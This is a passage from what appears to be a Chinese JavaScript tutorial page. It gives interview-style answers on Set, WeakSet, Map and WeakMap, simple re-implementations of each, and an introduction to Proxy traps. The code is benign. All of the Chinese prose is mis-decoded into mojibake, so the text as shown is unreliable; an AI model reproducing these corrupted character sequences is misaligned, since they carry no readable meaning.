ä¸­æ°¸ç”Ÿï¼›å¼±å¼•ç”¨æœºåˆ¶ä»…å¯¹éœ€è¦å›æ”¶çš„å¯¹è±¡æœ‰æ„ä¹‰</li><li>æŠ€æœ¯å®ç°é™åˆ¶ï¼šå¼•æ“åº•å±‚é€šè¿‡å¯¹è±¡æŒ‡é’ˆå®ç°å¼±å¼•ç”¨ï¼Œå¼±å…è®¸åŸå§‹å€¼ä¼šç ´åå¼±å¼•ç”¨è®¾è®¡åˆè¡·ï¼Œå¯¼è‡´æ°¸ä¹…å ç”¨å†…å­˜</li></ul><p><strong>Qï¼šSet å¦‚ä½•ä¿è¯å…ƒç´ çš„å”¯ä¸€æ€§ï¼Ÿ</strong></p><p>é€šè¿‡ SameValueZero ç®—æ³•å’Œåº•å±‚å“ˆå¸Œè¡¨ç°ï¼ˆæ’å…¥æ—¶å…ˆè®¡ç®—å“ˆå¸Œå€¼å®šä½æ¡¶ï¼Œæ¡¶å†…éå†é‡‡ç”¨ SameValueZero ç®—æ³•ç²¾ç¡®æ¯”å¯¹ï¼Œå­˜åœ¨ç›¸åŒå€¼åˆ™è¦†ç›–ï¼Œå¦åˆ™æ–°å¢ï¼‰</p><p><strong>Qï¼šWeakSet ä¸ºä»€ä¹ˆæ²¡æœ‰ size å±æ€§å’Œéå†æ–¹æ³•ï¼Ÿ</strong></p><p>å¼±å¼•ç”¨è®¾è®¡çº¦æŸï¼šæˆå‘˜å¯¹è±¡éƒ½æ˜¯å¼±å¼•ç”¨ï¼Œéšæ—¶å¯èƒ½è¢«å›æ”¶ï¼Œè®¡ç®— size å¯èƒ½ä¼šå¾—åˆ°éç¡®å®šçš„ç»“æœï¼ŒåŒæ ·ï¼Œéå†ç»“æœä¹Ÿä¸å¯é </p><p><strong>Qï¼šä¸ºä»€ä¹ˆ Map è¦ä¿æŒæ’å…¥é¡ºåºè€Œ Object ä¸ä¿è¯ï¼Ÿ</strong></p><ul><li>è®¾è®¡ç›®æ ‡å·®å¼‚ï¼šMap æ˜¯ä¸“é—¨è®¾è®¡çš„é”®å€¼é›†åˆï¼Œé¡ºåºæ˜¯å…¶æ ¸å¿ƒç‰¹æ–°è¦æ±‚ï¼ŒObject ä¸æ˜¯</li><li>å†å²å…¼å®¹æ€§ï¼šObject çš„ä¹±åºè¡Œä¸ºæ˜¯å†å²åŒ…è¢±ï¼ŒMap æ²¡æœ‰å†å²åŒ…è¢±ï¼Œç›´æ¥è§„èŒƒé¡ºåºä¿è¯</li><li>æ€§èƒ½å–èˆï¼šMap ç”¨é¢å¤–é“¾è¡¨ç»´æŠ¤é¡ºåºï¼ˆç©ºé—´æ¢æ—¶é—´ï¼‰ï¼ŒObject ä¸ºä¼˜åŒ–è®¿é—®é€Ÿåº¦ç‰ºç‰²é¡ºåº</li></ul><p><strong>Qï¼šWeakSet åœ¨åƒåœ¾å›æ”¶æ—¶çš„è¡Œä¸ºæ˜¯æ€æ ·çš„ï¼Ÿ</strong></p><ul><li>è‡ªåŠ¨æ¸…ç†ï¼šå½“ WeakSet ä¸­çš„æˆå‘˜å¤±å»å¼•ç”¨æ—¶ï¼ŒGC åƒåœ¾å›æ”¶å™¨ä¼šå°†è¯¥å¯¹è±¡ä» WeakSet ä¸­ç§»é™¤</li><li>ä¸å¯è§‚æµ‹æ€§ï¼šæ— æ³•ç›´æ¥è§‚æµ‹åˆ°å›æ”¶æ—¶æœº</li><li>å†…å­˜å½±å“ï¼šä¸ä¼šé˜»æ­¢å…¶é”®å¯¹è±¡è¢«å›æ”¶</li></ul><p><strong>Q: å¦‚ä½•ç”¨ Object æ¨¡æ‹Ÿå®ç°ä¸€ä¸ª Mapï¼Ÿ</strong></p><p>æ ¸å¿ƒå®ç°æ€è·¯ï¼š</p><p>ï¼ˆ1ï¼‰ç”¨ Symbol ä¿è¯å”¯ä¸€æ€§</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> _keys = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;keys&#x27;</span>);<br><span class="hljs-keyword">const</span> _values = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;values&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰åŸºæœ¬ç»“æ„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleMap</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>[_keys] = [];   <span class="hljs-comment">// å­˜å‚¨é”®</span><br>    <span class="hljs-variable language_">this</span>[_values] = []; <span class="hljs-comment">// å­˜å‚¨å€¼</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å…³é”®æ–¹æ³•å®ç°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">indexOf</span>(key);<br>  <span class="hljs-keyword">if</span> (index === -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">push</span>(key);<br>    <span class="hljs-variable language_">this</span>[_values].<span class="hljs-title function_">push</span>(value);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">this</span>[_values][index] = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) &#123;<br>  <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">indexOf</span>(key);<br>  <span class="hljs-keyword">return</span> index !== -<span class="hljs-number">1</span> ? <span class="hljs-variable language_">this</span>[_values][index] : <span class="hljs-literal">undefined</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q: è¯·æ‰‹å†™ä¸€ä¸ªç®€åŒ–ç‰ˆçš„ WeakMapï¼ˆä¸è€ƒè™‘å¼±å¼•ç”¨ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleWeakMap</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> = <span class="hljs-string">`weakmap@<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>; <span class="hljs-comment">// å”¯ä¸€æ ‡è¯†ç¬¦</span><br>  &#125;<br><br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> key !== <span class="hljs-string">&#x27;object&#x27;</span> || key === <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Invalid key type&#x27;</span>);<br>    &#125;<br>    key[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] = value; <span class="hljs-comment">// ç›´æ¥å­˜å‚¨åˆ°å¯¹è±¡ä¸Š</span><br>  &#125;<br><br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">return</span> key?.[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> <span class="hljs-keyword">in</span> key;<br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(key)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">delete</span> key[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleWeakMap</span>();<br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>map.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;data&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(obj)); <span class="hljs-comment">// &#x27;data&#x27;</span><br>map.<span class="hljs-title function_">delete</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Q: å¦‚ä½•ç”¨æ•°ç»„å®ç° Set çš„åŸºæœ¬åŠŸèƒ½ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArraySet</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span> = [];<br>  &#125;<br><br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(value)) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">push</span>(value);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">includes</span>(value); <span class="hljs-comment">// æˆ– indexOf(value) !== -1</span><br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">indexOf</span>(value);<br>    <span class="hljs-keyword">if</span> (index &gt; -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">splice</span>(index, <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">get</span> <span class="hljs-title function_">size</span>() &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-property">length</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">clear</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span> = [];<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArraySet</span>();<br>set.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">2</span>).<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-property">size</span>); <span class="hljs-comment">// 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-title function_">has</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// true</span><br>set.<span class="hljs-title function_">delete</span>(<span class="hljs-number">1</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(set.<span class="hljs-title function_">has</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Q: æ¨¡æ‹Ÿå®ç°ä¸€ä¸ªæ”¯æŒåŸºæœ¬æ“ä½œçš„ WeakSet</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleWeakSet</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> = <span class="hljs-string">`weakset@<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>; <span class="hljs-comment">// å”¯ä¸€æ ‡è¯†ç¬¦</span><br>  &#125;<br><br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> || obj === <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Invalid value used in weak set&#x27;</span>);<br>    &#125;<br>    obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] = <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ ‡è®°å¯¹è±¡</span><br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">return</span> !!obj &amp;&amp; obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] === <span class="hljs-literal">true</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">delete</span> obj[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleWeakSet</span>();<br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>ws.<span class="hljs-title function_">add</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// true</span><br>ws.<span class="hljs-title function_">delete</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(ws.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><h1 id="Proxy-å’Œ-Reflect"><a href="#Proxy-å’Œ-Reflect" class="headerlink" title="Proxy å’Œ Reflect"></a>Proxy å’Œ Reflect</h1><h2 id="Proxy-è¯¦è§£"><a href="#Proxy-è¯¦è§£" class="headerlink" title="Proxy è¯¦è§£"></a>Proxy è¯¦è§£</h2><h3 id="ä»€ä¹ˆæ˜¯Proxyï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Proxyï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Proxyï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Proxyï¼Ÿ</h3><p>Proxy æ˜¯ ES6 å¼•å…¥çš„ä¸€ç§å…ƒç¼–ç¨‹ç‰¹æ€§ï¼Œå…è®¸ä½ åˆ›å»ºä¸€ä¸ªå¯¹è±¡çš„ä»£ç†ï¼Œä»è€Œæ‹¦æˆªå’Œè‡ªå®šä¹‰è¯¥å¯¹è±¡çš„åŸºæœ¬æ“ä½œï¼ˆå¦‚å±æ€§è®¿é—®ã€èµ‹å€¼ã€æšä¸¾ç­‰ï¼‰ï¼ŒProxy æä¾›äº†ä¸€ç§å¼ºå¤§çš„æœºåˆ¶æ¥æ§åˆ¶å’Œæ‰©å±•å¯¹è±¡çš„è¡Œä¸ºã€‚</p><h3 id="åŸºæœ¬è¯­æ³•"><a href="#åŸºæœ¬è¯­æ³•" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(target, handler);<br></code></pre></td></tr></table></figure><ul><li>targetï¼šè¦ä»£ç†çš„ç›®æ ‡å¯¹è±¡</li><li>handlerï¼šåŒ…å«è‡ªå®šä¹‰æ“ä½œçš„å¯¹è±¡ï¼Œhandler ä¸ºç©ºæ—¶ï¼Œæ²¡æœ‰ä»»ä½•æ‹¦æˆªæ•ˆæœï¼Œè®¿é—® Proxy ç­‰æ•ˆäºè®¿é—® target</li></ul><p>Proxy æ˜¯ ES6 åŸç”Ÿæä¾›çš„æ„é€ å‡½æ•°ï¼ŒProxy å®ä¾‹ä¹Ÿå¯ä»¥ç”¨ä½œå…¶ä»–å¯¹è±¡çš„åŸå‹å¯¹è±¡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼šè¦æƒ³ Proxy èµ·ä½œç”¨ï¼Œå¿…é¡»é’ˆå¯¹ Proxy çš„å®ä¾‹ï¼ˆproxyï¼‰è¿›è¡Œæ“ä½œï¼Œè€Œä¸æ˜¯é’ˆå¯¹ç›®æ ‡å¯¹è±¡ï¼ˆtargetï¼‰è¿›è¡Œæ“ä½œã€‚</p><h3 id="å¸¸ç”¨Handleræ–¹æ³•ï¼ˆTrapsï¼‰"><a href="#å¸¸ç”¨Handleræ–¹æ³•ï¼ˆTrapsï¼‰" class="headerlink" title="å¸¸ç”¨Handleræ–¹æ³•ï¼ˆTrapsï¼‰"></a>å¸¸ç”¨Handleræ–¹æ³•ï¼ˆTrapsï¼‰</h3><p><strong>get() - æ‹¦æˆªå±æ€§è¯»å–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property, receiver</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è¯»å–å±æ€§: <span class="hljs-subst">$&#123;property&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;, handler);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(proxy.<span class="hljs-property">name</span>); <span class="hljs-comment">// è¾“å‡º: è¯»å–å±æ€§: name â†’ Alice</span><br></code></pre></td></tr></table></figure><p><strong>set() - æ‹¦æˆªå±æ€§è®¾ç½®</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value, receiver</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è®¾ç½®å±æ€§: <span class="hljs-subst">$&#123;property&#125;</span> = <span class="hljs-subst">$&#123;value&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(...<span class="hljs-variable language_">arguments</span>);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, handler);<br>proxy.<span class="hljs-property">age</span> = <span class="hljs-number">30</span>; <span class="hljs-comment">// è¾“å‡º: è®¾ç½®å±æ€§: age = 30</span><br></code></pre></td></tr></table></figure><p><strong>apply() - æ‹¦æˆªå‡½æ•°è°ƒç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">apply</span>(<span class="hljs-params">target, thisArg, argumentsList</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`è°ƒç”¨å‡½æ•°ï¼Œå‚æ•°: <span class="hljs-subst">$&#123;argumentsList&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">target</span>(...argumentsList) * <span class="hljs-number">2</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b</span>) &#123; <span class="hljs-keyword">return</span> a + b; &#125;<br><br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(sum, handler);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">proxy</span>(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// è¾“å‡º: è°ƒç”¨å‡½æ•°ï¼Œå‚æ•°: 2,3 â†’ 10</span><br></code></pre></td></tr></table></figure><p><strong>has() - æ‹¦æˆª in æ“ä½œç¬¦</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">target, property</span>) &#123;<br>    <span class="hljs-keyword">if</span> (property.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">&#x27;_&#x27;</span>)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <span class="hljs-comment">// éšè—ç§æœ‰å±æ€§</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> property <span class="hljs-keyword">in</span> target;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-attr">_secret</span>: <span class="hljs-string">&#x27;123&#x27;</span> &#125;;<br><span class="hljs-keyword">const</span> proxy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, handler);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">in</span> proxy); <span class="hljs-comment">// true</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;_secret&#x27;</span> <span class="hljs-keyword">in</span> proxy); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>construct() - æ‹¦æˆª new æ“ä½œç¬¦</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">const</span> handler = &#123;<br>  <span class="hljs-title function_">construct</span>(<span class="hljs-params">target, argumentsList, newTarget</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`åˆ›å»ºå®ä¾‹: <span class="hljs-subst">$&#123;argumentsList&#125;</span>`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">target</span>(...argumentsList);<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProxyPerson</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(<span class="hljs-title class_">Person</span>, handler);<br><span class="hljs-keyword">const</span> p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyPerson</span>(<span class="hljs-string">&#x27;Charlie&#x27;</span>); <span class="hljs-comment">// è¾“å‡º: åˆ›å»ºå®ä¾‹: Charlie</span><br></code></pre></td></tr></table></figure><h3 id="å®Œæ•´-Handler-æ–¹æ³•åˆ—è¡¨"><a href="#å®Œæ•´-Handler-æ–¹æ³•åˆ—è¡¨" class="headerlink" title="å®Œæ•´ Handler æ–¹æ³•åˆ—è¡¨"></a>å®Œæ•´ Handler æ–¹æ³•åˆ—è¡¨</h3><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">æè¿°</th><th align="left">è§¦å‘æ“ä½œ</th></tr></thead><tbody><tr><td align="left">get(target, property, receiver)</td><td align="left">æ‹¦æˆªå±æ€§è¯»å–</td><td align="left">proxy.property, proxy[â€˜propertyâ€™]</td></tr><tr><td align="left">set(target, property, value, receiver)</td><td 